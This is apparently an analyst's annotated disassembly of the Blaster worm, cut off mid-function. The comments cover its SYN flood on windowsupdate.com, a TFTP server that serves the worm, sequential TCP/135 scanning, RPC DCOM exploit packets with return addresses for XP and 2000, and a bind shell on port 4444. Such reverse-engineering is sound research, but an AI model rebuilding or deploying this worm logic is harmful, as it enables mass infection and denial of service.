.text:004014DB                 mov     ecx, 0FEh
.text:004014E0                 cdq
.text:004014E1                 idiv    ecx
.text:004014E3                 mov     ds:octet2, edx  ; rand() % 254
.text:004014E9                 call    rand
.text:004014EE                 mov     ecx, 0FEh
.text:004014F3                 cdq
.text:004014F4                 idiv    ecx
.text:004014F6                 mov     ds:octet3, edx  ; rand() % 254
.text:004014FC 
.text:004014FC Check date to decide whether or not to SYN flood windowsupdate.com
.text:004014FC 
.text:004014FC loc_4014FC:                             ; CODE XREF: WinMain+26E^j
.text:004014FC                 push    3               ; cchDate
.text:004014FE                 lea     eax, [ebp+szDay]
.text:00401501                 push    eax             ; lpDateStr
.text:00401502                 push    offset aD       ; lpFormat = "d"
.text:00401507                 push    0               ; lpDate
.text:00401509                 push    0               ; dwFlags
.text:0040150B                 push    409h            ; Locale
.text:00401510                 call    GetDateFormatA
.text:00401515                 push    3               ; cchDate
.text:00401517                 lea     eax, [ebp+szMonth]
.text:0040151A                 push    eax             ; lpDateStr
.text:0040151B                 push    offset aM       ; lpFormat = "M"
.text:00401520                 push    0               ; lpDate
.text:00401522                 push    0               ; dwFlags
.text:00401524                 push    409h            ; Locale
.text:00401529                 call    GetDateFormatA
.text:0040152E                 lea     eax, [ebp+szDay]
.text:00401531                 push    eax
.text:00401532                 call    atoi
.text:00401537                 pop     ecx
.text:00401538                 cmp     eax, 0Fh        ; if day is after 15th...
.text:0040153B                 jg      short loc_40154C ; ...then SYN flood windowsupdate.com:80
.text:0040153D                 lea     edi, [ebp+szMonth]
.text:00401540                 push    edi
.text:00401541                 call    atoi
.text:00401546                 pop     ecx
.text:00401547                 cmp     eax, 8          ; ...or month is after August (8)...
.text:0040154A                 jle     short loc_401562 ; infinitely call infection loop function
.text:0040154C 
.text:0040154C If day is &#62; 15 or month &#62; 8 (August), create SYN flood thread
.text:0040154C 
.text:0040154C loc_40154C:                             ; CODE XREF: WinMain+2EB^j
.text:0040154C                 lea     eax, [ebp+ThreadId] ; ...then SYN flood windowsupdate.com:80
.text:0040154F                 push    eax             ; lpThreadId
.text:00401550                 push    0               ; dwCreationFlags
.text:00401552                 push    0               ; lpParameter
.text:00401554                 push    offset WUSYNFloodThread ; lpStartAddress
.text:00401559                 push    0               ; dwStackSize
.text:0040155B                 push    0               ; lpThreadAttributes
.text:0040155D                 call    CreateThread
.text:00401562 
.text:00401562 Infect sequential IP addresses endlessly, 20 hosts at a time
.text:00401562 
.text:00401562 loc_401562:                             ; CODE XREF: WinMain+2FA^j
.text:00401562                                         ; WinMain+317vj
.text:00401562                 call    infect20Hosts   ; infinitely call infection loop function
.text:00401567                 jmp     short loc_401562 ; infinitely call infection loop function
.text:00401569 ; ---------------------------------------------------------------------------
.text:00401569                 call    WSACleanup
.text:0040156E                 xor     eax, eax
.text:00401570 
.text:00401570 loc_401570:                             ; CODE XREF: WinMain+AF^j
.text:00401570                 pop     edi             ; return
.text:00401571                 pop     esi
.text:00401572                 leave
.text:00401573                 retn    10h
.text:00401573 WinMain         endp
.text:00401573 
.text:00401576 
.text:00401576 ; =============== S U B R O U T I N E =======================================
.text:00401576 
.text:00401576 ; Attributes: bp-based frame
.text:00401576 
.text:00401576 TFTPServerThread proc near              ; DATA XREF: infectTarget+39Fvo
.text:00401576 
.text:00401576 buf             = byte ptr -42Ch
.text:00401576 name            = sockaddr ptr -228h
.text:00401576 to              = sockaddr ptr -218h
.text:00401576 tolen           = dword ptr -208h
.text:00401576 var_204         = word ptr -204h
.text:00401576 var_202         = word ptr -202h
.text:00401576 var_200         = byte ptr -200h
.text:00401576 
.text:00401576                 push    ebp
.text:00401577                 mov     ebp, esp
.text:00401579                 sub     esp, 42Ch
.text:0040157F                 push    ebx
.text:00401580                 push    esi
.text:00401581                 push    edi
.text:00401582                 mov     dwTFTPInProgress, 1
.text:0040158C 
.text:0040158C loc_40158C:                             ; CODE XREF: TFTPServerThread+16Fvj
.text:0040158C                 push    0               ; protocol = IPPROTO_IP
.text:0040158E                 push    2               ; type = SOCK_DGRAM
.text:00401590                 push    2               ; af = AF_INET
.text:00401592                 call    socket
.text:00401597                 mov     ds:s, eax
.text:0040159C                 cmp     eax, 0FFFFFFFFh
.text:0040159F                 jz      loc_4016EA
.text:004015A5                 push    10h
.text:004015A7                 push    0
.text:004015A9                 lea     eax, [ebp+name]
.text:004015AF                 push    eax
.text:004015B0                 call    memset
.text:004015B5                 add     esp, 0Ch
.text:004015B8                 mov     [ebp+name.sa_family], 2
.text:004015C1                 push    45h             ; hostshort = 69 (TFTP)
.text:004015C3                 call    htons
.text:004015C8                 mov     edx, eax
.text:004015CA                 mov     word ptr [ebp+name.sa_data], dx
.text:004015D1                 and     dword ptr [ebp+name.sa_data+2], 0
.text:004015D8                 push    10h             ; namelen
.text:004015DA                 lea     eax, [ebp+name]
.text:004015E0                 push    eax             ; name
.text:004015E1                 push    ds:s            ; s
.text:004015E7                 call    bind
.text:004015EC                 or      eax, eax
.text:004015EE                 jnz     loc_4016EA
.text:004015F4                 mov     [ebp+tolen], 10h
.text:004015FE                 lea     eax, [ebp+tolen]
.text:00401604                 push    eax             ; fromlen
.text:00401605                 lea     eax, [ebp+to]
.text:0040160B                 push    eax             ; from
.text:0040160C                 push    0               ; flags
.text:0040160E                 push    204h            ; len
.text:00401613                 lea     eax, [ebp+buf]
.text:00401619                 push    eax             ; buf
.text:0040161A                 push    ds:s            ; s
.text:00401620                 call    recvfrom
.text:00401625                 cmp     eax, 1
.text:00401628                 jl      loc_4016EA
.text:0040162E                 xor     ebx, ebx
.text:00401630                 push    offset aRb      ; "rb"
.text:00401635                 push    offset Filename ; 260 (104h) = MAX_PATH
.text:0040163A                 call    fopen
.text:0040163F                 add     esp, 8
.text:00401642                 mov     esi, eax
.text:00401644                 or      eax, eax
.text:00401646                 jz      loc_4016EA
.text:0040164C 
.text:0040164C loc_40164C:                             ; CODE XREF: TFTPServerThread+15Dvj
.text:0040164C                 inc     ebx
.text:0040164D                 push    3               ; hostshort
.text:0040164F                 call    htons
.text:00401654                 mov     edx, eax
.text:00401656                 mov     [ebp+var_204], dx ; TFTP packet format: (all network order)
.text:00401656                                         ; 0000  WORD = 3?
.text:00401656                                         ; 0002  WORD chunk number (starts at 1)
.text:00401656                                         ; 0004  start of data
.text:0040165D                 mov     eax, ebx
.text:0040165F                 and     eax, 0FFFFh
.text:00401664                 push    eax             ; hostshort
.text:00401665                 call    htons
.text:0040166A                 mov     edx, eax
.text:0040166C                 mov     [ebp+var_202], dx
.text:00401673                 push    esi
.text:00401674                 push    200h
.text:00401679                 push    1
.text:0040167B                 lea     eax, [ebp+var_200]
.text:00401681                 push    eax
.text:00401682                 call    fread
.text:00401687                 add     esp, 10h
.text:0040168A                 mov     edi, eax        ; length actually read
.text:0040168C                 add     edi, 4          ; + 4 (for TFTP header)
.text:0040168F                 push    [ebp+tolen]     ; tolen
.text:00401695                 lea     eax, [ebp+to]
.text:0040169B                 push    eax             ; to
.text:0040169C                 push    0               ; flags
.text:0040169E                 push    edi             ; len
.text:0040169F                 lea     eax, [ebp+var_204]
.text:004016A5                 push    eax             ; buf
.text:004016A6                 push    ds:s            ; s
.text:004016AC                 call    sendto
.text:004016B1                 cmp     eax, 1
.text:004016B4                 jl      short loc_4016D8
.text:004016B6                 push    384h            ; dwMilliseconds
.text:004016BB                 call    Sleep           ; sleep for 0.9 seconds
.text:004016C0                 cmp     edi, 204h
.text:004016C6                 jnb     short loc_4016D3
.text:004016C8                 push    esi
.text:004016C9                 call    fclose
.text:004016CE                 pop     ecx
.text:004016CF                 xor     esi, esi
.text:004016D1                 jmp     short loc_4016D8
.text:004016D3 ; ---------------------------------------------------------------------------
.text:004016D3 
.text:004016D3 loc_4016D3:                             ; CODE XREF: TFTPServerThread+150^j
.text:004016D3                 jmp     loc_40164C
.text:004016D8 ; ---------------------------------------------------------------------------
.text:004016D8 
.text:004016D8 loc_4016D8:                             ; CODE XREF: TFTPServerThread+13E^j
.text:004016D8                                         ; TFTPServerThread+15B^j
.text:004016D8                 or      esi, esi
.text:004016DA                 jz      short loc_4016EA
.text:004016DC                 push    esi
.text:004016DD                 call    fclose
.text:004016E2                 pop     ecx
.text:004016E3                 jmp     short loc_4016EA
.text:004016E5 ; ---------------------------------------------------------------------------
.text:004016E5                 jmp     loc_40158C
.text:004016EA ; ---------------------------------------------------------------------------
.text:004016EA 
.text:004016EA loc_4016EA:                             ; CODE XREF: TFTPServerThread+29^j
.text:004016EA                                         ; TFTPServerThread+78^j ...
.text:004016EA                 and     dwTFTPInProgress, 0
.text:004016F1                 push    ds:s            ; s
.text:004016F7                 call    closesocket
.text:004016FC                 push    0               ; dwExitCode
.text:004016FE                 call    ExitThread
.text:00401703                 xor     eax, eax
.text:00401705                 pop     edi
.text:00401706                 pop     esi
.text:00401707                 pop     ebx
.text:00401708                 leave
.text:00401709                 retn    4
.text:00401709 TFTPServerThread endp
.text:00401709 
.text:0040170C 
.text:0040170C ; =============== S U B R O U T I N E =======================================
.text:0040170C 
.text:0040170C 
.text:0040170C incrementOctets proc near               ; CODE XREF: incrementOctets+68vj
.text:0040170C                                         ; infect20Hosts+6Fvp
.text:0040170C                 cmp     ds:octet4, 0FEh
.text:00401716                 jle     short loc_401727 ; increment 4th octet and stop if in range [0-254]
.text:00401718                 and     ds:octet4, 0    ; 4th octet rolls over to 0; increment 3rd octet
.text:0040171F                 inc     ds:octet3
.text:00401725                 jmp     short loc_40172F ; stop if octet3 is now in range [0-254]
.text:00401727 ; ---------------------------------------------------------------------------
.text:00401727 
.text:00401727 loc_401727:                             ; CODE XREF: incrementOctets+A^j
.text:00401727                 inc     ds:octet4       ; increment 4th octet and stop if in range [0-254]
.text:0040172D                 jmp     short locret_401776 ; return
.text:0040172F ; ---------------------------------------------------------------------------
.text:0040172F 
.text:0040172F loc_40172F:                             ; CODE XREF: incrementOctets+19^j
.text:0040172F                 cmp     ds:octet3, 0FEh ; stop if octet3 is now in range [0-254]
.text:00401739                 jle     short locret_401776 ; return
.text:0040173B                 and     ds:octet3, 0    ; 3rd octet rolls over to 0; increment 2nd octet
.text:00401742                 inc     ds:octet2
.text:00401748                 cmp     ds:octet2, 0FEh ; stop if octet2 is now in range [0-254]
.text:00401752                 jle     short locret_401776 ; return
.text:00401754                 and     ds:octet2, 0    ; 2nd octet rolls over to 0; increment 1st octet
.text:0040175B                 inc     ds:octet1
.text:00401761                 cmp     ds:octet1, 0FEh ; keep 1st octet if now in range [0-254];
.text:0040176B                 jle     short loc_401774 ; increment 4th octet again so addr is never x.0.0.0
.text:0040176D                 and     ds:octet1, 0    ; otherwise, 1st octet rolls over to 0
.text:00401774 
.text:00401774 loc_401774:                             ; CODE XREF: incrementOctets+5F^j
.text:00401774                 jmp     short incrementOctets ; increment 4th octet again so addr is never x.0.0.0
.text:00401776 ; ---------------------------------------------------------------------------
.text:00401776 
.text:00401776 locret_401776:                          ; CODE XREF: incrementOctets+21^j
.text:00401776                                         ; incrementOctets+2D^j ...
.text:00401776                 retn                    ; return
.text:00401776 incrementOctets endp
.text:00401776 
.text:00401777 
.text:00401777 ; =============== S U B R O U T I N E =======================================
.text:00401777 
.text:00401777 ; Attributes: bp-based frame
.text:00401777 
.text:00401777 infect20Hosts   proc near               ; CODE XREF: WinMain+312^p
.text:00401777 
.text:00401777 var_18C         = dword ptr -18Ch
.text:00401777 writefds        = fd_set ptr -188h
.text:00401777 var_84          = byte ptr -84h
.text:00401777 in              = in_addr ptr -80h
.text:00401777 namelen         = dword ptr -74h
.text:00401777 argp            = dword ptr -70h
.text:00401777 name            = sockaddr ptr -6Ch
.text:00401777 timeout         = timeval ptr -5Ch
.text:00401777 var_54          = dword ptr -54h
.text:00401777 s               = dword ptr -50h
.text:00401777 
.text:00401777                 push    ebp
.text:00401778                 mov     ebp, esp
.text:0040177A                 sub     esp, 18Ch
.text:00401780                 push    ebx
.text:00401781                 push    esi
.text:00401782                 push    edi
.text:00401783                 mov     [ebp+argp], 1   ; set argp for ioctlsocket() to 1 (on)
.text:0040178A                 push    10h
.text:0040178C                 push    0
.text:0040178E                 lea     eax, [ebp+name]
.text:00401791                 push    eax
.text:00401792                 call    memset
.text:00401797                 add     esp, 0Ch
.text:0040179A                 mov     [ebp+name.sa_family], 2 ; AF_INET
.text:004017A0                 push    87h             ; hostshort = port TCP&#47;135
.text:004017A5                 call    htons
.text:004017AA                 mov     esi, eax
.text:004017AC                 mov     word ptr [ebp+name.sa_data], si
.text:004017B0                 xor     edi, edi
.text:004017B2 
.text:004017B2 Create 20 non-blocking TCP&#47;IP sockets
.text:004017B2 
.text:004017B2 loc_4017B2:                             ; CODE XREF: infect20Hosts+6Bvj
.text:004017B2                 push    0               ; protocol = IPPROTO_IP
.text:004017B4                 push    1               ; type = SOCK_STREAM
.text:004017B6                 push    2               ; af = AF_INET
.text:004017B8                 call    socket
.text:004017BD                 mov     [ebp+edi*4+s], eax
.text:004017C1                 cmp     [ebp+edi*4+s], 0FFFFFFFFh
.text:004017C6                 jz      loc_401924      ; return
.text:004017CC                 lea     eax, [ebp+argp]
.text:004017CF                 push    eax             ; argp = 1 (on)
.text:004017D0                 push    8004667Eh       ; cmd = FIONBIO
.text:004017D5                 push    [ebp+edi*4+s]   ; s[EDI]
.text:004017D9                 call    ioctlsocket
.text:004017DE                 inc     edi
.text:004017DF                 cmp     edi, 14h
.text:004017E2                 jl      short loc_4017B2 ; loop 20 times
.text:004017E4                 xor     edi, edi
.text:004017E6 
.text:004017E6 Try to connect sockets to port TCP&#47;135 on 20 sequential IP addresses
.text:004017E6 
.text:004017E6 loc_4017E6:                             ; CODE XREF: infect20Hosts+CDvj
.text:004017E6                 call    incrementOctets ; connect loop -- executed 20 times
.text:004017EB                 push    ds:octet4
.text:004017F1                 push    ds:octet3
.text:004017F7                 push    ds:octet2
.text:004017FD                 push    ds:octet1
.text:00401803                 push    offset aI_I_I_I ; "%i.%i.%i.%i"
.text:00401808                 push    offset cp
.text:0040180D                 call    sprintf         ; convert four octets into a string
.text:00401812                 add     esp, 18h
.text:00401815                 push    offset cp       ; cp
.text:0040181A                 call    inet_addr       ; now convert string into DWORD
.text:0040181F                 mov     [ebp+var_54], eax
.text:00401822                 cmp     eax, 0FFFFFFFFh
.text:00401825                 jz      loc_401924      ; return
.text:0040182B                 mov     eax, [ebp+var_54]
.text:0040182E                 mov     dword ptr [ebp+name.sa_data+2], eax
.text:00401831                 push    10h             ; namelen
.text:00401833                 lea     eax, [ebp+name]
.text:00401836                 push    eax             ; name
.text:00401837                 push    [ebp+edi*4+s]   ; s[EDI]
.text:0040183B                 call    connect
.text:00401840                 inc     edi
.text:00401841                 cmp     edi, 14h
.text:00401844                 jl      short loc_4017E6 ; connect loop -- executed 20 times
.text:00401846                 push    708h            ; dwMilliseconds
.text:0040184B                 call    Sleep           ; wait 1.8 seconds
.text:00401850                 xor     edi, edi
.text:00401852 
.text:00401852 Look for connected sockets by doing a select() on each s[EDI] (EDI=0..19)
.text:00401852 
.text:00401852 loc_401852:                             ; CODE XREF: infect20Hosts+1A7vj
.text:00401852                 and     [ebp+timeout.tv_sec], 0
.text:00401856                 and     [ebp+timeout.tv_usec], 0 ; zero out timeval struct
.text:00401856                                         ; (timeout of 0 = return instantly)
.text:0040185A                 and     [ebp+writefds.fd_count], 0 ; FD_ZERO(&#38;writefds)
.text:00401861 
.text:00401861 --- start of FD_SET macro code
.text:00401861 
.text:00401861                 and     [ebp+var_18C], 0 ; FD_SET(s[EDI], &#38;writefds)
.text:00401868                 jmp     short loc_401883
.text:0040186A ; ---------------------------------------------------------------------------
.text:0040186A 
.text:0040186A loc_40186A:                             ; CODE XREF: infect20Hosts+118vj
.text:0040186A                 mov     esi, [ebp+var_18C]
.text:00401870                 mov     ebx, [ebp+edi*4+s] ; EDI = index into s[] socket array
.text:00401870                                         ; EBX = socket s[EDI]
.text:00401874                 cmp     [ebp+esi*4+writefds.fd_array], ebx
.text:0040187B                 jz      short loc_401891
.text:0040187D                 inc     [ebp+var_18C]
.text:00401883 
.text:00401883 loc_401883:                             ; CODE XREF: infect20Hosts+F1^j
.text:00401883                 mov     eax, [ebp+writefds.fd_count]
.text:00401889                 cmp     [ebp+var_18C], eax
.text:0040188F                 jb      short loc_40186A
.text:00401891 
.text:00401891 loc_401891:                             ; CODE XREF: infect20Hosts+104^j
.text:00401891                 mov     eax, [ebp+writefds.fd_count]
.text:00401897                 cmp     [ebp+var_18C], eax
.text:0040189D                 jnz     short loc_4018BB
.text:0040189F                 cmp     eax, 40h
.text:004018A2                 jnb     short loc_4018BB
.text:004018A4                 mov     esi, [ebp+var_18C]
.text:004018AA                 mov     ebx, [ebp+edi*4+s]
.text:004018AE                 mov     [ebp+esi*4+writefds.fd_array], ebx
.text:004018B5                 inc     [ebp+writefds.fd_count]
.text:004018B5 
.text:004018B5 --- end of FD_SET macro code
.text:004018BB 
.text:004018BB loc_4018BB:                             ; CODE XREF: infect20Hosts+126^j
.text:004018BB                                         ; infect20Hosts+12B^j
.text:004018BB                 lea     eax, [ebp+timeout]
.text:004018BE                 push    eax             ; timeout
.text:004018BF                 push    0               ; exceptfds
.text:004018C1                 lea     eax, [ebp+writefds]
.text:004018C7                 push    eax             ; writefds
.text:004018C8                 push    0               ; readfds
.text:004018CA                 push    0               ; nfds
.text:004018CC                 call    select          ; writefds will be list of connected sockets
.text:004018D1                 cmp     eax, 1
.text:004018D4                 jge     short loc_4018E1 ; did select() succeed?
.text:004018D6                 push    [ebp+edi*4+s]   ; s
.text:004018DA                 call    closesocket     ; close socket s[EDI] if select() failed
.text:004018DF                 jmp     short loc_40191A ; advance to next iteration of loop
.text:004018E1 ; ---------------------------------------------------------------------------
.text:004018E1 
.text:004018E1 loc_4018E1:                             ; CODE XREF: infect20Hosts+15D^j
.text:004018E1                 mov     [ebp+namelen], 10h
.text:004018E8                 lea     eax, [ebp+namelen]
.text:004018EB                 push    eax             ; namelen
.text:004018EC                 lea     eax, [ebp+var_84]
.text:004018F2                 push    eax             ; name
.text:004018F3                 push    [ebp+edi*4+s]   ; s
.text:004018F7                 call    getpeername
.text:004018FC                 push    dword ptr [ebp+in.S_un] ; in
.text:004018FF                 call    inet_ntoa
.text:00401904                 push    eax             ; szIPAddr: string representation of IP address to infect
.text:00401905                 push    [ebp+edi*4+s]   ; s: socket connected to remote TCP&#47;135
.text:00401909                 call    infectTarget    ; infect a single host by sending command
.text:00401909                                         ; shell exploit and issuing command to
.text:00401909                                         ; download worm executable via TFTP
.text:0040190E                 add     esp, 8
.text:00401911                 push    [ebp+edi*4+s]   ; s
.text:00401915                 call    closesocket     ; close TCP&#47;135 socket
.text:0040191A 
.text:0040191A loc_40191A:                             ; CODE XREF: infect20Hosts+168^j
.text:0040191A                 inc     edi
.text:0040191B                 cmp     edi, 14h
.text:0040191E                 jl      loc_401852      ; check each of the 20 sockets in array for connection
.text:00401924 
.text:00401924 loc_401924:                             ; CODE XREF: infect20Hosts+4F^j
.text:00401924                                         ; infect20Hosts+AE^j
.text:00401924                 pop     edi             ; return
.text:00401925                 pop     esi
.text:00401926                 pop     ebx
.text:00401927                 leave
.text:00401928                 retn
.text:00401928 infect20Hosts   endp
.text:00401928 
.text:00401929 
.text:00401929 ; =============== S U B R O U T I N E =======================================
.text:00401929 
.text:00401929 ; Attributes: bp-based frame
.text:00401929 
.text:00401929 ; int __cdecl infectTarget(SOCKET s,char *szIPAddr)
.text:00401929 infectTarget    proc near               ; CODE XREF: infect20Hosts+192^p
.text:00401929 
.text:00401929 ThreadId        = dword ptr -1934h
.text:00401929 var_1930        = dword ptr -1930h
.text:00401929 namelen         = dword ptr -192Ch
.text:00401929 var_1928        = byte ptr -1928h
.text:00401929 var_18F8        = byte ptr -18F8h
.text:00401929 var_18BC        = byte ptr -18BCh
.text:00401929 buf             = byte ptr -155Ch
.text:00401929 var_1514        = dword ptr -1514h
.text:00401929 argp            = dword ptr -1510h
.text:00401929 var_150C        = byte ptr -150Ch
.text:00401929 var_14E8        = byte ptr -14E8h
.text:00401929 hObject         = dword ptr -1240h
.text:00401929 var_123C        = dword ptr -123Ch
.text:00401929 name            = sockaddr ptr -1238h
.text:00401929 var_1228        = byte ptr -1228h
.text:00401929 var_1224        = byte ptr -1224h
.text:00401929 var_1223        = byte ptr -1223h
.text:00401929 var_1222        = byte ptr -1222h
.text:00401929 var_1221        = byte ptr -1221h
.text:00401929 var_1218        = dword ptr -1218h
.text:00401929 var_1210        = dword ptr -1210h
.text:00401929 var_1208        = dword ptr -1208h
.text:00401929 var_1204        = byte ptr -1204h
.text:00401929 len             = dword ptr -1004h
.text:00401929 var_1000        = byte ptr -1000h
.text:00401929 var_FF8         = dword ptr -0FF8h
.text:00401929 var_FF0         = dword ptr -0FF0h
.text:00401929 var_F80         = dword ptr -0F80h
.text:00401929 var_F7C         = dword ptr -0F7Ch
.text:00401929 var_F4C         = dword ptr -0F4Ch
.text:00401929 var_F48         = dword ptr -0F48h
.text:00401929 var_F30         = dword ptr -0F30h
.text:00401929 var_E74         = dword ptr -0E74h
.text:00401929 s               = dword ptr  8
.text:00401929 szIPAddr        = dword ptr  0Ch
.text:00401929 
.text:00401929                 push    ebp             ; flags
.text:0040192A                 mov     ebp, esp
.text:0040192C                 mov     eax, 2934h
.text:00401931                 call    allocstackspace ; used when &#62; 4KB stack space needed
.text:00401936                 push    ebx             ; len
.text:00401937                 push    esi             ; buf
.text:00401938                 push    edi             ; s
.text:00401939                 and     [ebp+argp], 0   ; set argp for ioctlsocket() to 0 (off)
.text:00401940                 lea     eax, [ebp+argp]
.text:00401946                 push    eax             ; argp = 0 (off)
.text:00401947                 push    8004667Eh       ; cmd = FIONBIO
.text:0040194C                 push    [ebp+s]         ; s
.text:0040194F                 call    ioctlsocket     ; make sure socket does blocking I&#47;O
.text:00401954                 cmp     ds:dwWhichRetAddr, 1 ; 80% chance set to 1 (XP), 20% set to 2 (2000)
.text:0040195B                 jnz     short loc_401969 ; 2000 "universal" return address (20% probability)
.text:0040195B                                         ; 0018759Fh is a "CALL EBX" in unicode.nls
.text:0040195D 
.text:0040195D Assemble RPC DCOM exploit packets
.text:0040195D 
.text:0040195D                 mov     [ebp+var_1514], 100139Dh ; XP "universal" return address (80% probability)
.text:0040195D                                         ; 0100139Dh is a "CALL EBX" in svchost.exe
.text:00401967                 jmp     short loc_401973
.text:00401969 ; ---------------------------------------------------------------------------
.text:00401969 
.text:00401969 loc_401969:                             ; CODE XREF: infectTarget+32^j
.text:00401969                 mov     [ebp+var_1514], 18759Fh ; 2000 "universal" return address (20% probability)
.text:00401969                                         ; 0018759Fh is a "CALL EBX" in unicode.nls
.text:00401973 
.text:00401973 loc_401973:                             ; CODE XREF: infectTarget+3E^j
.text:00401973                 lea     edi, [ebp+buf]
.text:00401979                 lea     esi, ds:4040C0h ; bindstr[]
.text:0040197F                 mov     ecx, 12h        ; size = 0048h (72)
.text:00401984                 rep movsd
.text:00401986                 lea     edi, [ebp+var_18BC]
.text:0040198C                 lea     esi, ds:404108h ; request1[]
.text:00401992                 mov     ecx, 0D8h       ; size = 0360h (864)
.text:00401997                 rep movsd
.text:00401999                 lea     edi, [ebp+var_1218]
.text:0040199F                 lea     esi, ds:404468h ; request2[]
.text:004019A5                 mov     ecx, 4          ; size = 0010h (16)
.text:004019AA                 rep movsd
.text:004019AC                 lea     edi, [ebp+var_18F8]
.text:004019B2                 lea     esi, ds:404478h ; request3[]
.text:004019B8                 mov     ecx, 0Fh        ; size = 003Ch (60)
.text:004019BD                 rep movsd
.text:004019BF                 lea     edi, [ebp+var_150C]
.text:004019C5                 lea     esi, ds:4044B4h ; sc
.text:004019CB                 mov     ecx, 0B3h       ; size = 02CCh (716)
.text:004019D0                 rep movsd
.text:004019D2                 lea     edi, [ebp+var_1928]
.text:004019D8                 lea     esi, ds:404780h ; request4[]
.text:004019DE                 mov     ecx, 0Ch        ; size = 0030h (48)
.text:004019E3                 rep movsd
.text:004019E5                 push    4
.text:004019E7                 lea     eax, [ebp+var_1514]
.text:004019ED                 push    eax
.text:004019EE                 lea     eax, [ebp+var_14E8]
.text:004019F4                 push    eax
.text:004019F5                 call    memcpy
.text:004019FA                 mov     [ebp+var_1930], 2CCh
.text:00401A04                 push    360h
.text:00401A09                 lea     eax, [ebp+var_18BC]
.text:00401A0F                 push    eax
.text:00401A10                 lea     eax, [ebp+var_1000]
.text:00401A16                 push    eax
.text:00401A17                 call    memcpy
.text:00401A1C                 mov     [ebp+len], 360h
.text:00401A26                 add     [ebp+var_1218], 166h
.text:00401A30                 mov     eax, [ebp+var_1210]
.text:00401A36                 add     eax, 166h
.text:00401A3B                 mov     [ebp+var_1210], eax
.text:00401A41                 push    10h
.text:00401A43                 lea     eax, [ebp+var_1218]
.text:00401A49                 push    eax
.text:00401A4A                 lea     eax, [ebp+var_1000]
.text:00401A50                 add     eax, 360h
.text:00401A55                 push    eax
.text:00401A56                 call    memcpy
.text:00401A5B                 mov     [ebp+len], 370h
.text:00401A65                 push    2CCh
.text:00401A6A                 lea     eax, [ebp+var_150C]
.text:00401A70                 push    eax
.text:00401A71                 lea     eax, [ebp+var_1000]
.text:00401A77                 add     eax, 370h
.text:00401A7C                 push    eax
.text:00401A7D                 call    memcpy
.text:00401A82                 mov     [ebp+len], 63Ch
.text:00401A8C                 push    3Ch
.text:00401A8E                 lea     eax, [ebp+var_18F8]
.text:00401A94                 push    eax
.text:00401A95                 lea     eax, [ebp+var_1000]
.text:00401A9B                 add     eax, 63Ch
.text:00401AA0                 push    eax
.text:00401AA1                 call    memcpy
.text:00401AA6                 mov     [ebp+len], 678h
.text:00401AB0                 push    30h
.text:00401AB2                 lea     eax, [ebp+var_1928]
.text:00401AB8                 push    eax
.text:00401AB9                 lea     eax, [ebp+var_1000]
.text:00401ABF                 add     eax, 678h
.text:00401AC4                 push    eax
.text:00401AC5                 call    memcpy
.text:00401ACA                 add     esp, 48h
.text:00401ACD                 mov     [ebp+len], 6A8h
.text:00401AD7                 mov     eax, [ebp+var_FF8]
.text:00401ADD                 add     eax, 2C0h
.text:00401AE2                 mov     [ebp+var_FF8], eax
.text:00401AE8                 mov     eax, [ebp+var_FF0]
.text:00401AEE                 add     eax, 2C0h
.text:00401AF3                 mov     [ebp+var_FF0], eax
.text:00401AF9                 mov     eax, [ebp+var_F80]
.text:00401AFF                 add     eax, 2C0h
.text:00401B04                 mov     [ebp+var_F80], eax
.text:00401B0A                 mov     eax, [ebp+var_F7C]
.text:00401B10                 add     eax, 2C0h
.text:00401B15                 mov     [ebp+var_F7C], eax
.text:00401B1B                 mov     eax, [ebp+var_F4C]
.text:00401B21                 add     eax, 2C0h
.text:00401B26                 mov     [ebp+var_F4C], eax
.text:00401B2C                 mov     eax, [ebp+var_F48]
.text:00401B32                 add     eax, 2C0h
.text:00401B37                 mov     [ebp+var_F48], eax
.text:00401B3D                 mov     eax, [ebp+var_F30]
.text:00401B43                 add     eax, 2C0h
.text:00401B48                 mov     [ebp+var_F30], eax
.text:00401B4E                 mov     eax, [ebp+var_E74]
.text:00401B54                 add     eax, 2C0h
.text:00401B59                 mov     [ebp+var_E74], eax
.text:00401B5F                 push    0               ; flags
.text:00401B61                 push    48h             ; len
.text:00401B63                 lea     eax, [ebp+buf]
.text:00401B69                 push    eax             ; buf
.text:00401B6A                 push    [ebp+s]         ; s
.text:00401B6D                 call    send            ; send RPC bind packet (bindstr[])
.text:00401B72                 cmp     eax, 0FFFFFFFFh
.text:00401B75                 jz      loc_401E3B      ; return
.text:00401B7B                 push    0               ; flags
.text:00401B7D                 push    [ebp+len]       ; len
.text:00401B83                 lea     eax, [ebp+var_1000]
.text:00401B89                 push    eax             ; buf
.text:00401B8A                 push    [ebp+s]         ; s
.text:00401B8D                 call    send            ; send assembled DCOM REMACT exploit packet
.text:00401B92                 cmp     eax, 0FFFFFFFFh
.text:00401B95                 jz      loc_401E3B      ; return
.text:00401B9B                 push    [ebp+s]         ; s
.text:00401B9E                 call    closesocket     ; close TCP&#47;135 socket
.text:00401BA3                 push    190h            ; dwMilliseconds
.text:00401BA8                 call    Sleep           ; sleep for 0.4 seconds
.text:00401BAD 
.text:00401BAD Connect to remote command shell
.text:00401BAD 
.text:00401BAD                 push    0               ; protocol = IPPROTO_TCP
.text:00401BAF                 push    1               ; type = SOCK_STREAM
.text:00401BB1                 push    2               ; af = AF_INET
.text:00401BB3                 call    socket          ; create new TCP&#47;IP socket for connecting to command shell
.text:00401BB8                 mov     [ebp+var_1208], eax
.text:00401BBE                 cmp     eax, 0FFFFFFFFh
.text:00401BC1                 jz      loc_401E3B      ; return
.text:00401BC7                 push    10h
.text:00401BC9                 push    0
.text:00401BCB                 lea     eax, [ebp+name]
.text:00401BD1                 push    eax
.text:00401BD2                 call    memset
.text:00401BD7                 add     esp, 0Ch
.text:00401BDA                 mov     [ebp+name.sa_family], 2
.text:00401BE3                 push    115Ch           ; hostshort = 4444
.text:00401BE8                 call    htons
.text:00401BED                 mov     edi, eax
.text:00401BEF                 mov     word ptr [ebp+name.sa_data], di
.text:00401BF6                 push    [ebp+szIPAddr]  ; cp
.text:00401BF9                 call    inet_addr
.text:00401BFE                 mov     [ebp+var_123C], eax
.text:00401C04                 cmp     eax, 0FFFFFFFFh
.text:00401C07                 jz      loc_401E3B      ; return
.text:00401C0D                 mov     eax, [ebp+var_123C]
.text:00401C13                 mov     dword ptr [ebp+name.sa_data+2], eax
.text:00401C19                 push    10h             ; namelen
.text:00401C1B                 lea     eax, [ebp+name]
.text:00401C21                 push    eax             ; name
.text:00401C22                 push    [ebp+var_1208]  ; s
.text:00401C28                 call    connect         ; attempt to connect to command shell on port TCP&#47;4444
.text:00401C2D                 cmp     eax, 0FFFFFFFFh
